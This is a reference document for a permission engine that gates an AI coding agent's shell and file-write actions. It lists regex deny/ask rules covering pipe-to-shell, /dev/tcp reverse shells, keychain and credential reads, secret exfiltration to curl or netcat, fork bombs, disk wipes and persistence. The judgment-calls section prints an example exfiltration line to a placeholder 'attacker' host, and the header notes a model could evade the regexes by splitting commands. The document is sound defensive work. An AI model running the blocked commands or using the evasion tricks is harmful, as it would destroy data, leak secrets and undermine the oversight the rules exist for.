# Reference - Default Blacklist (shipped `rules.yaml` defaults)

> Canonical default deny/ask lists for [permission-engine](permission-engine.spec.md).
> Compiled from prior art (sources at the bottom). **Two tiers:** `deny` = hard block
> (catastrophic/irreversible, no everyday legit use); `ask` = prompt the human. Everything
> else auto-allows. macOS-targeted. Ships **locked-down**; the user opts into loosening.
>
> ⚠️ Pattern-blocking is **accident-prevention, not a security boundary** - a determined model
> can split a command across `;`/`&&`/`|` segments or use vars/aliases to evade any regex.
> Pair it with the OS sandbox. Regexes assume the matcher reconstructs the full command and
> matches per `;`/`&&`/`|` segment where possible (rules use `[^|;&]*` to stay in-segment).

## Revisions

**2026-06-28 — rule tiering pass (shipped).** The canonical shipped file is
[`CompanionKit/Sources/CompanionKit/Resources/default-rules.yaml`](../../../CompanionKit/Sources/CompanionKit/Resources/default-rules.yaml);
the YAML below is rationale and may lag it. Changes (each engine-verified with a regression test):

- **`rm -rf` retiered** (fixes the 2026-06-18 false-positive below). DENY is now *catastrophic only*:
  `/`, `/*`, `~`, `$HOME`, an unset-var-at-end (→ `/`), and top-level system dirs (`/etc`, `/usr`,
  `/System`, …). **Scratch** (`/tmp`, `/tmp/…`, `/var/tmp`, `$TMPDIR`) and **build artifacts**
  (`rm -rf build`, `node_modules`, `dist/`) → **allow**. Other absolute/home paths and the cwd-wipers
  `rm -rf *` / `.` / `..` / `./*` → **ask**.
- **`git push` retiered.** Plain `git push` → **allow** (non-fast-forward is rejected by git anyway);
  only force-push (`-f`/`--force`, not `--force-with-lease`) → **ask**. (Removed the catch-all push ask.)
- **Pipe-to-shell tightened.** `\b(?:curl|wget|fetch)\b[^|]*\|…sh` → `\b(?:curl|wget)\b[^|;&\n]*\|…sh`:
  dropped `fetch` (matched `git fetch`) and constrained `[^|;&\n]` so the downloader and the `| sh`
  must be in the **same** segment (no more false-positive on `git fetch … ; … | bash local.sh`).

## `rules.yaml`

```yaml
# =============================================================================
# DENY - hard block. Catastrophic / irreversible / no everyday legit use.
# =============================================================================
deny:

  # --- Filesystem destruction ------------------------------------------------
  # rm -rf (any flag order) of root, home, $HOME, ~, /*, or a bare var that could
  # expand to root. Scoped so it does NOT fire on rm -rf ./build, node_modules, dist.
  - { tool: Bash, command_regex: '\brm\s+(?:-[a-zA-Z]*\s+|--[a-z-]+\s+)*-?[rR][fF]?\s+(?:-[a-zA-Z]*\s+)*(?:/|~|/\*|\$HOME|\$\{HOME\}|"\$HOME"|\$\w+/?\s*$|--no-preserve-root)' }
  - { tool: Bash, command_regex: '\brm\b[^|;&]*--no-preserve-root' }            # sole purpose: defeat the rm-of-/ guard
  - { tool: Bash, command_regex: '\bfind\s+(?:/|~|\$HOME|/\s)[^|]*\s-(?:delete|exec\s+rm)\b' }  # whole-FS walk-and-delete
  # ⚠ FALSE-POSITIVE (found 2026-06-18): the bare `/` alternative matches ANY absolute path, so
  #   `find /tmp/x -delete` / `find /home/u/proj -delete` get DENIED though they're benign. Intent
  #   was root only. Fix: drop the bare `/`, anchor to root → `(?:/\s|/$|~|\$HOME|/\*)`. (Behavior
  #   change → make it in the engine + a regression test, not just here.)
  - { tool: Bash, command_regex: '\bmv\s+(?:[^>|]*\s)?(?:~|/|\$HOME|/\*)\s+/dev/null\b' }        # discards data via /dev/null

  # --- Disk / partition destruction ------------------------------------------
  - { tool: Bash, command_regex: '\bdd\b[^|;&]*\bof=\s*/dev/(?:r?disk\d|sd[a-z]|nvme\d|hd[a-z])' }  # overwrite raw disk
  - { tool: Bash, command_regex: '\b(?:mkfs(?:\.\w+)?|newfs(?:_\w+)?)\b' }                          # format device
  - { tool: Bash, command_regex: '\bdiskutil\s+(?:[a-zA-Z]+\s+)?(?:eraseDisk|eraseVolume|reformat|zeroDisk|randomDisk|secureErase|partitionDisk|apfs\s+(?:delete|erase|resize))\b' }  # macOS disk wipe
  - { tool: Bash, command_regex: '>\s*/dev/(?:r?disk\d|sd[a-z]|nvme\d|hd[a-z])\b' }                 # redirect into raw disk

  # --- Fork bomb -------------------------------------------------------------
  - { tool: Bash, command_regex: '\(\s*\)\s*\{[^}]*\|[^}]*&[^}]*\}\s*;\s*\S+' }   # fn(){ x|x& };x  (tight; review if it ever fires)
  - { tool: Bash, command_regex: ':\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:' } # textbook :(){ :|:& };:

  # --- Privilege-policy edits -------------------------------------------------
  - { tool: Bash, command_regex: '/etc/sudoers(?:\.d)?\b' }                        # modifying sudoers = silent root

  # --- System control --------------------------------------------------------
  - { tool: Bash, command_regex: '\bkill\s+-(?:9|KILL|s\s*(?:9|KILL))\s+(?:-1|1)\b' }  # kill init / every process
  - { tool: Bash, command_regex: '\b(?:shutdown|reboot|halt|poweroff)\b' }            # powers off / reboots mid-session

  # --- Permissions catastrophes ----------------------------------------------
  - { tool: Bash, command_regex: '\bchmod\s+(?:-[a-zA-Z]*\s+)*0?777\s+(?:-[a-zA-Z]*\s+)*(?:/|~|\$HOME|/\*)\s*$' }   # chmod 777 / 
  - { tool: Bash, command_regex: '\bchmod\s+(?:-[a-zA-Z]*\s+)*-R\s+\S+\s+(?:/|~|\$HOME|/\*)\s*$' }                  # recursive chmod of tree
  - { tool: Bash, command_regex: '\bchown\s+(?:-[a-zA-Z]*\s+)*-R\s+\S+\s+(?:/|~|\$HOME|/\*)\s*$' }                  # recursive chown of /, ~

  # --- Writes into system trees ----------------------------------------------
  - { tool: Bash, command_regex: '>>?\s*/(?:etc|usr|bin|sbin|System|Library)(?:/|\s|$)' }   # clobber OS dirs

  # --- Pipe-to-shell / RCE ---------------------------------------------------
  - { tool: Bash, command_regex: '\b(?:curl|wget|fetch)\b[^|]*\|\s*(?:sudo\s+)?(?:ba|z|da|k|fi|t?c)?sh\b' }  # curl ... | sh
  - { tool: Bash, command_regex: '\b(?:ba|z|da|k|c)?sh\b\s+<\(\s*(?:curl|wget|fetch)\b' }                    # sh <(curl ...)
  - { tool: Bash, command_regex: '\b(?:base64\s+(?:-[dD]|--decode)|xxd\s+-r|openssl\s+(?:base64|enc)\b[^|]*-d)\b[^|]*\|\s*(?:sudo\s+)?(?:ba|z|da|k)?sh\b' }  # decode|sh
  - { tool: Bash, command_regex: '\beval\b[^|;&]*\$\(\s*(?:curl|wget|fetch)\b' }                             # eval "$(curl ...)"
  - { tool: Bash, command_regex: '/dev/(?:tcp|udp)/' }                                                       # reverse shell

  # --- Write-tool denies (path-based) ----------------------------------------
  - { tool: Write, path_glob: '/etc/**' }
  - { tool: Write, path_glob: '/System/**' }
  - { tool: Write, path_glob: '/usr/**' }
  - { tool: Write, path_glob: '{/,~/}Library/Launch{Agents,Daemons}/**' }   # boot/login persistence
  - { tool: Write, path_glob: '/private/etc/**' }                           # /etc → /private/etc symlink


# =============================================================================
# ASK - prompt the human. Risky / sensitive / outward-facing; legit uses exist.
# =============================================================================
ask:

  # --- Privilege escalation ---------------------------------------------------
  - { tool: Bash, command_regex: '^\s*(?:sudo|doas)\b' }
  - { tool: Bash, command_regex: '^\s*su\b(?:\s+-|\s+\w+|\s*$)' }                 # bare su (not sudo/subl)

  # --- Recursive force-delete of project paths (root/home already denied) -----
  - { tool: Bash, command_regex: '\brm\s+(?:-[a-zA-Z]*\s+)*-?[rR][fF]?\b(?![^|;&]*(?:/|~|\$HOME|--no-preserve-root))' }

  # --- Remote / irreversible VCS ---------------------------------------------
  - { tool: Bash, command_regex: '\bgit\s+push\b(?:[^|;&]*\s)?(?:-f\b|--force(?!-with-lease))' }  # force-push (with-lease allowed)
  - { tool: Bash, command_regex: '\bgit\s+push\b' }                                               # any push mutates a remote
  - { tool: Bash, command_regex: '\bgit\s+reset\s+(?:[^|;&]*\s)?--hard\b' }
  - { tool: Bash, command_regex: '\bgit\s+clean\b[^|;&]*-[a-z]*f[a-z]*\b' }
  - { tool: Bash, command_regex: '\bgit\s+(?:filter-branch|filter-repo)\b' }
  - { tool: Bash, command_regex: '\bgit\s+rebase\b[^|;&]*(?:-i|--interactive|--onto)\b' }
  - { tool: Bash, command_regex: '\bgit\s+update-ref\s+-d\b|\bgit\s+reflog\s+(?:expire|delete)\b' }

  # --- Publishing / releasing ------------------------------------------------
  - { tool: Bash, command_regex: '\b(?:npm|pnpm|yarn|bun)\s+publish\b' }
  - { tool: Bash, command_regex: '\bcargo\s+publish\b' }
  - { tool: Bash, command_regex: '\b(?:twine\s+upload|python\s+-m\s+twine\s+upload|poetry\s+publish|flit\s+publish)\b' }
  - { tool: Bash, command_regex: '\bgem\s+push\b' }
  - { tool: Bash, command_regex: '\bgh\s+release\s+(?:create|delete|upload)\b' }
  - { tool: Bash, command_regex: '\bdocker\s+(?:image\s+)?push\b' }

  # --- Cloud destructive ------------------------------------------------------
  - { tool: Bash, command_regex: '\baws\s+\S+\s+(?:delete|remove|terminate|deregister|purge|destroy)[\w-]*\b' }
  - { tool: Bash, command_regex: '\baws\s+s3\s+rb\b|\baws\s+s3(?:api)?\s+(?:rm|delete-object|delete-bucket)\b' }
  - { tool: Bash, command_regex: '\bgcloud\s+[\w.-]+(?:\s+[\w.-]+)*\s+delete\b' }
  - { tool: Bash, command_regex: '\baz\s+[\w.-]+(?:\s+[\w.-]+)*\s+delete\b' }
  - { tool: Bash, command_regex: '\bkubectl\s+delete\b' }
  - { tool: Bash, command_regex: '\bkubectl\b[^|;&]*\bdrain\b|\bkubectl\s+(?:cordon|taint)\b' }
  - { tool: Bash, command_regex: '\bterraform\s+(?:destroy|apply)\b' }
  - { tool: Bash, command_regex: '\bhelm\s+(?:delete|uninstall)\b' }

  # --- Secrets reading / exfiltration ----------------------------------------
  - { tool: Bash, command_regex: '(?:\.ssh/(?:id_[a-z0-9]+|.*_rsa|.*\.pem)\b|\.aws/credentials\b|\.config/gcloud\b|\.kube/config\b|\.netrc\b|\.npmrc\b|\.pypirc\b|\.docker/config\.json)' }
  - { tool: Bash, command_regex: '\bsecurity\s+(?:dump-keychain|find-(?:generic|internet)-password|export)\b' }   # macOS keychain dump
  - { tool: Bash, command_regex: '\b(?:cat|less|more|head|tail|grep|rg|strings|xxd|base64)\b[^|;&]*\.env(?:\.\w+)?\b' }  # shell-read of .env
  - { tool: Bash, command_regex: '\b(?:printenv|env|set|export)\b[^|;&]*\|\s*(?:curl|wget|nc|ncat|netcat|socat)\b' }    # env → network
  - { tool: Bash, command_regex: '\b(?:cat|tail|head|grep)\b[^|]*(?:\.env|credentials|id_rsa|\.pem|secret|token|\.netrc)[^|]*\|\s*(?:curl|wget|nc|ncat|netcat|socat)\b' }
  - { tool: Bash, command_regex: '\b(?:curl|wget)\b[^|;&]*(?:-d|--data|-T|--upload-file|-F|--form)\b[^|;&]*(?:\$\(|\$\{?(?:[A-Z_]*(?:TOKEN|KEY|SECRET|PASS|CRED))|\.env|id_rsa|credentials)' }
  - { tool: Bash, command_regex: '\b(?:nc|ncat|netcat|socat)\b[^|;&]*<\s*(?:\S*(?:\.env|id_rsa|\.pem|credentials|\.netrc))' }

  # --- Persistence ------------------------------------------------------------
  - { tool: Bash, command_regex: '\bcrontab\b(?:\s+-|\s+\S)' }
  - { tool: Bash, command_regex: '\blaunchctl\s+(?:load|bootstrap|enable|submit)\b' }
  - { tool: Bash, command_regex: '>>?\s*~?/?[^|;&]*/?(?:\.zshrc|\.bashrc|\.bash_profile|\.profile|\.zprofile|\.zshenv)\b' }  # rc/PATH hijack
  - { tool: Bash, command_regex: '>>?\s*[^|;&]*/(?:LaunchAgents|LaunchDaemons)/[^|;&]*\.plist\b' }

  # --- Database destruction ---------------------------------------------------
  - { tool: Bash, command_regex: '(?i)\b(?:drop\s+(?:database|schema|table)|truncate\s+table)\b' }
  - { tool: Bash, command_regex: '(?i)\bdelete\s+from\s+\w+\s*(?:;|$|--)' }       # DELETE FROM with no WHERE
  - { tool: Bash, command_regex: '\b(?:psql|mysql|mariadb|mongosh|redis-cli)\b[^|;&]*-(?:c|e|-eval|-command)\b' }  # DB one-liner (may over-trigger; ask)
  - { tool: Bash, command_regex: '\b(?:dropdb|mysqladmin\s+drop)\b' }

  # --- Mass process kill ------------------------------------------------------
  - { tool: Bash, command_regex: '\bkillall\b' }
```

## Judgment calls / deliberately left OUT (false-positive avoidance)
- **Bare `curl`/`wget` are NOT denied** - routine dev fetches URLs constantly. Only
  `curl|sh`, `eval $(curl)`, and `curl -d $SECRET` shapes are listed. (Claude Code's own
  baseline denies all `curl` - too aggressive for an "auto-approve except footguns" tool.)
  Gap: `curl https://attacker/?d=$(cat secret)` with an inlined secret is only partially
  caught; a determined adversary evades regex (encoding/chunking). Accident-prevention, not a guarantee.
- **`rm -rf ./build`, `node_modules`, `dist`, `target`** auto-allowed - the deny `rm` is
  anchored to root/home/wildcard; the ask `rm -rf` uses a negative lookahead so project
  deletes only *ask*.
- **`git push --force-with-lease`** explicitly allowed (the safe alternative).
- **Read-only ops allowed:** `crontab -l`, `launchctl list/print`, `diskutil list/info`,
  `security find-certificate`, `terraform plan`, `git revert/stash/restore`.
- **`kill`/`pkill` of normal PIDs** allowed; only `kill -9 1`/`-9 -1` denied, `killall` is ask.
- **`chmod`/`chown` on project files** allowed; only `777`/`-R` on `/`,`~`,`$HOME`,`/*` denied.
- **Writing/editing `.env` via the Write tool** allowed (devs create `.env` constantly); only
  *shell reads* of `.env` are `ask` (the exfil precursor).
- **Two rules most likely to misfire:** the fork-bomb pattern and the DB one-liner
  (`psql … -c` matches harmless `SELECT`s) - the DB one is `ask` not `deny` on purpose;
  validate both against a real command corpus before shipping. Consider a tighter
  "deny only on DROP/TRUNCATE inside `-c`" variant if prompts get noisy.

## macOS vs Linux notes
- Raw disks: macOS `/dev/disk*` + `/dev/rdisk*`; Linux `/dev/sd*`,`/dev/nvme*`,`/dev/hd*` - both covered.
- Disk wipe verb: macOS `diskutil eraseDisk`; Linux `mkfs`/`wipefs` - both covered.
- `/etc` on macOS is a symlink to `/private/etc` - Write deny lists both.
- Persistence: macOS `launchctl` + `~/Library/LaunchAgents` / `/Library/LaunchDaemons`
  (`/System/Library/...` is SIP-protected). Linux `systemctl`/`/etc/systemd` is NOT in this
  macOS-targeted list - add if we go cross-platform.

## Sources
Dangerous-command lists: hongkiat, tecmint, ostechnix, operavps, howtogeek.
Claude Code permissions/baseline + "effects not names": claudedirectory, General Analysis
bash-tool-security, Backslash, ksred, CC issues #19966 (curl/wget allowlist gotcha) & #26862
(deny_patterns). Agent safety / pipe-to-shell / exfil: tirith, LLMtary, curlbash_detect,
kicksecure, SkillSieve, agent-secrets, dzone "4 ways agents exfiltrate secrets",
MITRE ATLAS AML-T0086, IBM secrets-detection, BlackFog. Git destructive: git-scm filter-branch,
newren/git-filter-repo, git-tower, phoenixnap, owais.io. Cloud destructive: cyberpanel, spacelift,
env0, hashicorp/terraform-provider-kubernetes#944. macOS-specific: osxhub, iboysoft, makeuseof
(LaunchAgents/Daemons), victoronsoftware (launchd), cocomelonc (persistence reverse-shell plist),
Objective-See, redfoxsec.
